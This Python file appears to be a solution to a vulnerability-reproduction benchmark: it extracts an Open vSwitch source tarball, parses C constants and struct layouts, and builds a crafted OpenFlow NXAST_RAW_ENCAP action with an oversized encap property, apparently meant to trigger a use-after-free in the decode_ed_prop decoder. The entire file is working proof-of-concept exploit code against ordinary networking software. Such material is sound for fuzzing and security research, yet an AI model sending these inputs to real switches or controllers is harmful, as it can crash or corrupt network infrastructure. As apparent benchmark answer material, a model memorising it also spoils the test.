import os
import re
import ast
import tarfile
import tempfile
import shutil
import struct
from typing import Dict, Optional, List, Tuple, Any


def _align8(n: int) -> int:
    return (n + 7) & ~7


def _safe_extract_tar(tar_path: str, dst_dir: str) -> None:
    with tarfile.open(tar_path, "r:*") as tf:
        for m in tf.getmembers():
            name = m.name
            if not name or name.startswith("/") or ".." in name.split("/"):
                continue
            tf.extract(m, dst_dir)


def _read_file_bytes(path: str, max_size: int = 2_500_000) -> Optional[bytes]:
    try:
        st = os.stat(path)
        if st.st_size > max_size:
            return None
        with open(path, "rb") as f:
            return f.read()
    except Exception:
        return None


def _read_file_text(path: str, max_size: int = 2_500_000) -> Optional[str]:
    b = _read_file_bytes(path, max_size=max_size)
    if b is None:
        return None
    try:
        return b.decode("utf-8", errors="ignore")
    except Exception:
        return None


def _strip_c_comments(s: str) -> str:
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.DOTALL)
    s = re.sub(r"//.*?$", "", s, flags=re.MULTILINE)
    return s


def _find_files(root: str, exts: Tuple[str, ...] = (".c", ".h", ".cc", ".cpp", ".cxx", ".hpp")) -> List[str]:
    out = []
    for dp, _, fns in os.walk(root):
        for fn in fns:
            if fn.lower().endswith(exts):
                out.append(os.path.join(dp, fn))
    return out


def _find_files_containing(root: str, needle: bytes, exts: Tuple[str, ...] = (".c", ".h", ".cc", ".cpp", ".cxx", ".hpp")) -> List[str]:
    out = []
    for dp, _, fns in os.walk(root):
        for fn in fns:
            if not fn.lower().endswith(exts):
                continue
            p = os.path.join(dp, fn)
            b = _read_file_bytes(p)
            if b is None:
                continue
            if needle in b:
                out.append(p)
    return out


def _find_function_body(text: str, func_name: str) -> Optional[str]:
    idx = text.find(func_name)
    if idx < 0:
        return None
    brace = text.find("{", idx)
    if brace < 0:
        return None
    depth = 0
    i = brace
    n = len(text)
    while i < n:
        c = text[i]
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return text[brace:i + 1]
        i += 1
    return None


_ALLOWED_AST_NODES = (
    ast.Expression,
    ast.BinOp,
    ast.UnaryOp,
    ast.Constant,
    ast.Num,
    ast.Add,
    ast.Sub,
    ast.Mult,
    ast.FloorDiv,
    ast.Div,
    ast.Mod,
    ast.LShift,
    ast.RShift,
    ast.BitOr,
    ast.BitAnd,
    ast.BitXor,
    ast.Invert,
    ast.UAdd,
    ast.USub,
    ast.ParenExpr if hasattr(ast, "ParenExpr") else ast.Expression,
)


def _safe_eval_expr(expr: str) -> Optional[int]:
    try:
        tree = ast.parse(expr, mode="eval")
    except Exception:
        return None
    for node in ast.walk(tree):
        if not isinstance(node, _ALLOWED_AST_NODES):
            return None
    try:
        val = eval(compile(tree, "<cexpr>", "eval"), {"__builtins__": {}}, {})
    except Exception:
        return None
    try:
        return int(val)
    except Exception:
        return None


_CAST_RE = re.compile(
    r"\(\s*(?:const\s+)?(?:unsigned\s+|signed\s+)?(?:long\s+|short\s+|int\s+|char\s+|bool\s+|size_t\s+|ptrdiff_t\s+|"
    r"u?int(?:8|16|32|64)_t|ovs_(?:be|le)(?:16|32|64)|enum\s+[A-Za-z_]\w*)\s*\)"
)


def _normalize_c_expr(expr: str) -> str:
    expr = expr.strip()
    expr = re.sub(r"\bUINT(?:8|16|32|64)_C\s*\(\s*([^)]+?)\s*\)", r"(\1)", expr)
    expr = re.sub(r"\bINT(?:8|16|32|64)_C\s*\(\s*([^)]+?)\s*\)", r"(\1)", expr)
    expr = re.sub(r"\bUINTMAX_C\s*\(\s*([^)]+?)\s*\)", r"(\1)", expr)
    expr = re.sub(r"\bINTMAX_C\s*\(\s*([^)]+?)\s*\)", r"(\1)", expr)
    expr = _CAST_RE.sub("", expr)
    expr = re.sub(r"(\b0x[0-9A-Fa-f]+|\b\d+)([uUlL]+)\b", r"\1", expr)
    return expr


_IDENT_RE = re.compile(r"\b[A-Za-z_]\w*\b")


def _subst_idents(expr: str, values: Dict[str, int]) -> str:
    def repl(m: re.Match) -> str:
        name = m.group(0)
        if name in values:
            return str(values[name])
        return name
    return _IDENT_RE.sub(repl, expr)


class _ConstResolver:
    def __init__(self) -> None:
        self.values: Dict[str, int] = {}
        self.pending: Dict[str, str] = {}

    def add_value(self, name: str, val: int) -> None:
        if name not in self.values:
            self.values[name] = int(val)

    def add_expr(self, name: str, expr: str) -> None:
        if name in self.values:
            return
        expr = expr.strip()
        if not expr:
            return
        self.pending[name] = expr

    def resolve_all(self, max_rounds: int = 1000) -> None:
        for _ in range(max_rounds):
            progress = False
            for k in list(self.pending.keys()):
                expr = _normalize_c_expr(self.pending[k])
                expr2 = _subst_idents(expr, self.values)
                if "sizeof" in expr2:
                    continue
                if re.search(r"\b[A-Za-z_]\w*\b", expr2):
                    unresolved = False
                    for ident in set(_IDENT_RE.findall(expr2)):
                        if ident in ("sizeof",):
                            unresolved = True
                            break
                        if ident not in self.values and not re.fullmatch(r"\d+", ident) and not ident.startswith("0x"):
                            unresolved = True
                            break
                    if unresolved:
                        continue
                val = _safe_eval_expr(expr2)
                if val is None:
                    continue
                self.values[k] = int(val)
                del self.pending[k]
                progress = True
            if not progress:
                break

    def get(self, name: str) -> Optional[int]:
        if name in self.values:
            return self.values[name]
        if name in self.pending:
            self.resolve_all()
        return self.values.get(name)


def _parse_defines(text: str, resolver: _ConstResolver) -> None:
    t = _strip_c_comments(text)
    for m in re.finditer(r"(?m)^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.*)$", t):
        name = m.group(1)
        if "(" in name:
            continue
        val = m.group(2).strip()
        if not val or val.startswith("(") and val.endswith(")") and len(val) <= 2:
            continue
        val = val.split("\\")[0].strip()
        if re.match(r"^[0-9]+$", val) or re.match(r"^0x[0-9A-Fa-f]+$", val):
            resolver.add_value(name, int(val, 0))
        else:
            resolver.add_expr(name, val)


def _split_top_level_commas(s: str) -> List[str]:
    parts = []
    cur = []
    depth_par = 0
    depth_br = 0
    for ch in s:
        if ch == "(":
            depth_par += 1
        elif ch == ")":
            depth_par = max(0, depth_par - 1)
        elif ch == "[":
            depth_br += 1
        elif ch == "]":
            depth_br = max(0, depth_br - 1)
        if ch == "," and depth_par == 0 and depth_br == 0:
            parts.append("".join(cur))
            cur = []
        else:
            cur.append(ch)
    if cur:
        parts.append("".join(cur))
    return parts


def _parse_enums(text: str, resolver: _ConstResolver) -> None:
    t = _strip_c_comments(text)
    i = 0
    n = len(t)
    while True:
        m = re.search(r"\benum\b", t[i:])
        if not m:
            break
        start = i + m.start()
        brace = t.find("{", start)
        if brace < 0:
            i = start + 4
            continue
        depth = 0
        j = brace
        while j < n:
            if t[j] == "{":
                depth += 1
            elif t[j] == "}":
                depth -= 1
                if depth == 0:
                    block = t[brace + 1:j]
                    entries = _split_top_level_commas(block)
                    cur_val = -1
                    for ent in entries:
                        ent = ent.strip()
                        if not ent:
                            continue
                        mm = re.match(r"^([A-Za-z_]\w*)\s*(?:=\s*(.+))?$", ent, flags=re.DOTALL)
                        if not mm:
                            continue
                        name = mm.group(1)
                        expr = mm.group(2)
                        if expr is None:
                            cur_val += 1
                            resolver.add_value(name, cur_val)
                        else:
                            expr = expr.strip()
                            expr_n = _normalize_c_expr(expr)
                            expr_n = _subst_idents(expr_n, resolver.values)
                            val = _safe_eval_expr(expr_n)
                            if val is not None:
                                cur_val = val
                                resolver.add_value(name, cur_val)
                            else:
                                resolver.add_expr(name, expr)
                                cur_val += 1
                    i = j + 1
                    break
            j += 1
        else:
            i = brace + 1


_TYPE_SIZES: Dict[str, int] = {
    "uint8_t": 1,
    "int8_t": 1,
    "char": 1,
    "unsigned char": 1,
    "int16_t": 2,
    "uint16_t": 2,
    "ovs_be16": 2,
    "ovs_le16": 2,
    "int32_t": 4,
    "uint32_t": 4,
    "ovs_be32": 4,
    "ovs_le32": 4,
    "int64_t": 8,
    "uint64_t": 8,
    "ovs_be64": 8,
    "ovs_le64": 8,
    "struct ofp_action_header": 4,
    "struct ofp_action_experimenter_header": 8,
    "struct ofp_action_vendor_header": 8,
}


def _clean_type(ty: str) -> str:
    ty = ty.strip()
    ty = re.sub(r"\bconst\b", "", ty)
    ty = re.sub(r"\bvolatile\b", "", ty)
    ty = re.sub(r"\s+", " ", ty).strip()
    ty = ty.replace(" *", "*").replace("* ", "*")
    return ty


def _eval_array_dim(dim: str, consts: _ConstResolver) -> Optional[int]:
    dim = dim.strip()
    if dim == "":
        return None
    if dim == "0":
        return 0
    dim = _normalize_c_expr(dim)
    dim = _subst_idents(dim, consts.values)
    v = _safe_eval_expr(dim)
    return v


def _extract_struct_blocks(text: str) -> Dict[str, str]:
    t = _strip_c_comments(text)
    blocks: Dict[str, str] = {}
    for m in re.finditer(r"\bstruct\s+([A-Za-z_]\w*)\s*\{", t):
        name = m.group(1)
        brace = t.find("{", m.end() - 1)
        if brace < 0:
            continue
        depth = 0
        i = brace
        n = len(t)
        while i < n:
            if t[i] == "{":
                depth += 1
            elif t[i] == "}":
                depth -= 1
                if depth == 0:
                    body = t[brace + 1:i]
                    blocks[name] = body
                    break
            i += 1
    return blocks


def _parse_struct_layout_from_body(body: str, consts: _ConstResolver) -> Tuple[int, List[Tuple[str, int, int]]]:
    # Returns (size, [(field_name, offset, size)])
    # Stops at first flexible array member.
    statements = [s.strip() for s in body.split(";")]
    off = 0
    layout: List[Tuple[str, int, int]] = []

    for st in statements:
        if not st:
            continue
        st = re.sub(r"\bOVS_PACKED\b", "", st)
        st = re.sub(r"__attribute__\s*\(\(.*?\)\)", "", st)
        st = st.strip()
        if not st:
            continue
        if st.startswith("union ") or st.startswith("struct ") and "{" in st:
            continue
        if st.startswith("enum ") and "{" in st:
            continue

        m = re.match(r"^(.+?)\s+(.+)$", st, flags=re.DOTALL)
        if not m:
            continue
        ty = _clean_type(m.group(1))
        decls = m.group(2).strip()
        if not decls:
            continue

        parts = _split_top_level_commas(decls)
        for d in parts:
            d = d.strip()
            if not d:
                continue
            d = d.split("=")[0].strip()
            # pointer?
            if "*" in d and not re.search(r"\[[^\]]*\]", d):
                continue
            dm = re.match(r"^\s*(\*?\s*[A-Za-z_]\w*)\s*(?:\[\s*([^\]]*)\s*\])?\s*$", d)
            if not dm:
                continue
            name = dm.group(1).replace("*", "").strip()
            arr_dim = dm.group(2)

            base_ty = ty
            if base_ty.startswith("struct ") or base_ty.startswith("enum "):
                pass
            size = _TYPE_SIZES.get(base_ty)
            if size is None:
                # common in ovs: "ovs_be16" etc already covered; maybe "ovs_u128" etc.
                size = _TYPE_SIZES.get(base_ty.replace("struct ", "struct "))
            if size is None:
                continue

            if arr_dim is not None:
                dimv = _eval_array_dim(arr_dim, consts)
                if dimv is None:
                    continue
                if dimv == 0:
                    return off, layout
                size_total = size * dimv
                layout.append((name, off, size_total))
                off += size_total
            else:
                layout.append((name, off, size))
                off += size

    return off, layout


def _choose_raw_encap_struct(struct_blocks: Dict[str, str]) -> Optional[str]:
    candidates = []
    for name, body in struct_blocks.items():
        if "raw" in name.lower() and "encap" in name.lower():
            b = body.lower()
            if "vendor" in b and "subtype" in b and "len" in b and "type" in b:
                candidates.append((name, len(body)))
            else:
                candidates.append((name, len(body)))
    if not candidates:
        return None
    candidates.sort(key=lambda x: (-("vendor" in struct_blocks[x[0]].lower() and "subtype" in struct_blocks[x[0]].lower()), x[1]))
    return candidates[0][0]


def _choose_ed_prop_header_struct(struct_blocks: Dict[str, str]) -> Optional[str]:
    best = None
    best_score = -1
    for name, body in struct_blocks.items():
        lname = name.lower()
        if "ed" in lname and "prop" in lname and "header" in lname:
            b = body.lower()
            score = 0
            if "type" in b:
                score += 5
            if "len" in b or "length" in b:
                score += 5
            if score > best_score:
                best = name
                best_score = score
    return best


def _detect_input_mode(root: str) -> Tuple[str, bool]:
    # returns (mode, has_version_prefix_for_actions)
    # mode in {"actions", "message"}
    fuzzer_files = _find_files_containing(root, b"LLVMFuzzerTestOneInput")
    if not fuzzer_files:
        # Some harnesses might not be libFuzzer; fallback based on presence of ofpacts_decode usage.
        if _find_files_containing(root, b"ofpmsg_decode") or _find_files_containing(root, b"ofpraw_pull"):
            return "message", False
        return "actions", False

    mode = "actions"
    version_prefix = False

    # Prefer a fuzzer that decodes actions directly if any.
    for p in fuzzer_files:
        t = _read_file_text(p) or ""
        tl = t.lower()
        if "ofpacts_decode" in t or "ofpacts_pull_openflow_actions" in t:
            mode = "actions"
            if re.search(r"\bdata\s*\+\s*1\b", t) and ("version" in tl or "ofp_version" in tl):
                version_prefix = True
            return mode, version_prefix

    # Otherwise decide if it's message-based.
    for p in fuzzer_files:
        t = _read_file_text(p) or ""
        if "ofpmsg_decode" in t or "ofpraw_pull" in t or "ofp_print" in t:
            mode = "message"
            return mode, False

    # Fallback: if any uses data+1 with version, assume prefix.
    for p in fuzzer_files:
        t = _read_file_text(p) or ""
        tl = t.lower()
        if re.search(r"\bdata\s*\+\s*1\b", t) and ("version" in tl or "ofp_version" in tl):
            version_prefix = True
            break

    return mode, version_prefix


def _pack_be(val: int, size: int) -> bytes:
    if size == 1:
        return struct.pack("!B", val & 0xFF)
    if size == 2:
        return struct.pack("!H", val & 0xFFFF)
    if size == 4:
        return struct.pack("!I", val & 0xFFFFFFFF)
    if size == 8:
        return struct.pack("!Q", val & 0xFFFFFFFFFFFFFFFF)
    return bytes([0] * size)


def _build_ofp10_packet_out(actions: bytes) -> bytes:
    version = 0x01
    msg_type = 0x0D  # OFPT_PACKET_OUT
    length = 16 + len(actions)
    xid = 0
    header = struct.pack("!BBHI", version, msg_type, length & 0xFFFF, xid)
    buffer_id = 0
    in_port = 0
    actions_len = len(actions)
    body = struct.pack("!IHH", buffer_id, in_port, actions_len & 0xFFFF)
    return header + body + actions


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="arvo_uaf_")
        try:
            _safe_extract_tar(src_path, tmpdir)
            root = tmpdir

            mode, version_prefix = _detect_input_mode(root)

            # Locate file with decode_NXAST_RAW_ENCAP to help select prop type.
            ofp_actions_cands = _find_files_containing(root, b"decode_NXAST_RAW_ENCAP")
            ofp_actions_text = ""
            if ofp_actions_cands:
                ofp_actions_text = _read_file_text(ofp_actions_cands[0]) or ""

            # Collect relevant files for constants and structs.
            relevant_files = set()
            for needle in (b"NXAST_RAW_ENCAP", b"NX_VENDOR_ID", b"RAW_ENCAP", b"ed_prop", b"ED_PROP", b"NXPEDPT"):
                for p in _find_files_containing(root, needle):
                    relevant_files.add(p)
            if ofp_actions_cands:
                relevant_files.add(ofp_actions_cands[0])

            # Fallback: include a few common headers if present.
            for p in _find_files_containing(root, b"nx-match.h"):
                relevant_files.add(p)
            for p in _find_files_containing(root, b"openflow.h"):
                relevant_files.add(p)

            resolver = _ConstResolver()
            struct_blocks_all: Dict[str, str] = {}
            for p in list(relevant_files)[:250]:
                txt = _read_file_text(p)
                if not txt:
                    continue
                _parse_defines(txt, resolver)
                _parse_enums(txt, resolver)
                sb = _extract_struct_blocks(txt)
                if sb:
                    struct_blocks_all.update(sb)

            resolver.resolve_all()

            nx_vendor_id = resolver.get("NX_VENDOR_ID")
            if nx_vendor_id is None:
                nx_vendor_id = 0x00002320

            nxast_raw_encap = resolver.get("NXAST_RAW_ENCAP")
            if nxast_raw_encap is None:
                # Try alternative naming
                nxast_raw_encap = resolver.get("NXAST_RAW_ENCAP".lower())
            if nxast_raw_encap is None:
                # Commonly in enum; fallback to a plausible non-zero
                nxast_raw_encap = 0

            # Pick action struct and parse layout.
            raw_encap_struct = _choose_raw_encap_struct(struct_blocks_all)
            action_struct_size = 16
            action_layout: List[Tuple[str, int, int]] = []
            if raw_encap_struct and raw_encap_struct in struct_blocks_all:
                body = struct_blocks_all[raw_encap_struct]
                sz, layout = _parse_struct_layout_from_body(body, resolver)
                if sz >= 12:
                    action_struct_size = sz
                    action_layout = layout

            # Pick ed_prop header struct and parse layout.
            ed_prop_hdr_struct = _choose_ed_prop_header_struct(struct_blocks_all)
            prop_hdr_size = 4
            prop_hdr_layout: List[Tuple[str, int, int]] = []
            if ed_prop_hdr_struct and ed_prop_hdr_struct in struct_blocks_all:
                body = struct_blocks_all[ed_prop_hdr_struct]
                sz, layout = _parse_struct_layout_from_body(body, resolver)
                if sz >= 4 and sz <= 32:
                    prop_hdr_size = sz
                    prop_hdr_layout = layout

            # Choose a property type constant name from decode_ed_prop switch cases.
            prop_type_name: Optional[str] = None
            prop_type_val: Optional[int] = None

            decode_ed_prop_body = _find_function_body(ofp_actions_text, "decode_ed_prop") if ofp_actions_text else None
            if decode_ed_prop_body:
                cases = list(re.finditer(r"\bcase\s+([A-Za-z_]\w*)\s*:", decode_ed_prop_body))
                if cases:
                    # Create block slices
                    candidates: List[Tuple[int, str]] = []
                    for idx, cm in enumerate(cases):
                        name = cm.group(1)
                        start = cm.end()
                        end = cases[idx + 1].start() if idx + 1 < len(cases) else len(decode_ed_prop_body)
                        block = decode_ed_prop_body[start:end]
                        score = 0
                        uname = name.upper()
                        if "RAW" in uname:
                            score += 100
                        if "HEADER" in uname:
                            score += 50
                        if "DATA" in uname or "BYTES" in uname:
                            score += 25
                        if re.search(r"\blen\s*-\s*", block):
                            score += 20
                        if "ofpbuf_put" in block or "ofpbuf_put_uninit" in block:
                            score += 10
                        if re.search(r"!=\s*sizeof\s*\(|==\s*sizeof\s*\(", block):
                            score -= 60
                        if re.search(r"\blen\s*!=\s*", block):
                            score -= 20
                        if "OFPERR" in block:
                            score -= 5
                        candidates.append((score, name))
                    candidates.sort(reverse=True)
                    for _, nm in candidates[:10]:
                        v = resolver.get(nm)
                        if v is not None:
                            prop_type_name = nm
                            prop_type_val = v
                            break

            # If still unknown, pick from known constants by heuristic.
            if prop_type_val is None:
                # Gather prop-type-like names we know values for.
                keys = list(resolver.values.keys())
                key_cands = []
                for k in keys:
                    uk = k.upper()
                    if "ED" in uk and "PROP" in uk and ("TYPE" not in uk):
                        sc = 0
                        if "RAW" in uk:
                            sc += 100
                        if "HEADER" in uk:
                            sc += 50
                        if "DATA" in uk or "BYTES" in uk:
                            sc += 25
                        if uk.startswith("NXPEDPT_") or uk.startswith("NX_ED_PROP_") or uk.startswith("OFPPROP_"):
                            sc += 10
                        key_cands.append((sc, k))
                key_cands.sort(reverse=True)
                if key_cands:
                    prop_type_name = key_cands[0][1]
                    prop_type_val = resolver.values.get(prop_type_name)

            if prop_type_val is None:
                prop_type_val = 0

            # Build action: single NXAST_RAW_ENCAP with one ed_prop consuming the rest.
            target_action_len = 72
            # Ensure we have room for at least a minimal property.
            min_payload = 16
            target_action_len = max(target_action_len, _align8(action_struct_size + _align8(prop_hdr_size + min_payload)))
            target_action_len = _align8(target_action_len)

            # Property length is remaining bytes (single prop).
            prop_len = target_action_len - action_struct_size
            if prop_len < prop_hdr_size + 8:
                target_action_len = _align8(action_struct_size + prop_hdr_size + 8)
                prop_len = target_action_len - action_struct_size
            prop_payload_len = prop_len - prop_hdr_size
            if prop_payload_len < 0:
                prop_payload_len = 0

            action = bytearray(b"\x00" * target_action_len)

            # Fill action fields by layout if available; else assume standard offsets.
            def set_field_by_name(layout: List[Tuple[str, int, int]], field_names: Tuple[str, ...], value: int) -> bool:
                for (nm, off, sz) in layout:
                    if nm in field_names:
                        action[off:off + sz] = _pack_be(value, sz)
                        return True
                return False

            if action_layout:
                # common field names
                set_field_by_name(action_layout, ("type",), 0xFFFF)
                set_field_by_name(action_layout, ("len",), target_action_len)
                set_field_by_name(action_layout, ("vendor", "experimenter"), nx_vendor_id)
                set_field_by_name(action_layout, ("subtype",), nxast_raw_encap)

                # If struct has any additional "*len" fields used by decoder, set them to props length.
                # Heuristic: fields with "len" in name excluding "len" itself.
                for (nm, off, sz) in action_layout:
                    lnm = nm.lower()
                    if "len" in lnm and nm not in ("len",):
                        if lnm in ("encap_len", "props_len", "header_len", "data_len"):
                            action[off:off + sz] = _pack_be(prop_len, sz)
            else:
                # Standard NX experimenter action header layout.
                action[0:2] = struct.pack("!H", 0xFFFF)
                action[2:4] = struct.pack("!H", target_action_len)
                action[4:8] = struct.pack("!I", nx_vendor_id & 0xFFFFFFFF)
                action[8:10] = struct.pack("!H", nxast_raw_encap & 0xFFFF)
                # rest zero
                action_struct_size = 16
                if action_struct_size > target_action_len:
                    action_struct_size = min(target_action_len, 16)
                prop_len = target_action_len - action_struct_size
                prop_payload_len = prop_len - prop_hdr_size
                if prop_payload_len < 0:
                    prop_payload_len = 0

            prop_off = action_struct_size

            # Fill property header by layout if available; else assume (type,len) 16-bit each.
            if prop_hdr_layout:
                # property header is within action; pack into action.
                # try set fields named "type" and "len"/"length"
                set = False
                for (nm, off, sz) in prop_hdr_layout:
                    if nm == "type":
                        action[prop_off + off:prop_off + off + sz] = _pack_be(prop_type_val, sz)
                        set = True
                if not set:
                    # fallback first member
                    if prop_hdr_layout:
                        nm, off, sz = prop_hdr_layout[0]
                        action[prop_off + off:prop_off + off + sz] = _pack_be(prop_type_val, sz)

                set_len = False
                for (nm, off, sz) in prop_hdr_layout:
                    if nm in ("len", "length"):
                        action[prop_off + off:prop_off + off + sz] = _pack_be(prop_len, sz)
                        set_len = True
                if not set_len and len(prop_hdr_layout) >= 2:
                    nm, off, sz = prop_hdr_layout[1]
                    action[prop_off + off:prop_off + off + sz] = _pack_be(prop_len, sz)
            else:
                # assume 16-bit type and 16-bit len
                if prop_hdr_size < 4:
                    prop_hdr_size = 4
                action[prop_off:prop_off + 2] = struct.pack("!H", prop_type_val & 0xFFFF)
                action[prop_off + 2:prop_off + 4] = struct.pack("!H", prop_len & 0xFFFF)

            # Fill payload with a non-zero pattern to avoid special-case paths.
            payload_off = prop_off + prop_hdr_size
            if payload_off < len(action):
                for i in range(prop_payload_len):
                    action[payload_off + i] = (0x41 + (i % 23)) & 0xFF

            actions_bytes = bytes(action)

            if mode == "message":
                return _build_ofp10_packet_out(actions_bytes)

            if version_prefix:
                # Use a common OpenFlow wire version byte; 0x04 (OpenFlow 1.3).
                return bytes([0x04]) + actions_bytes

            return actions_bytes
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)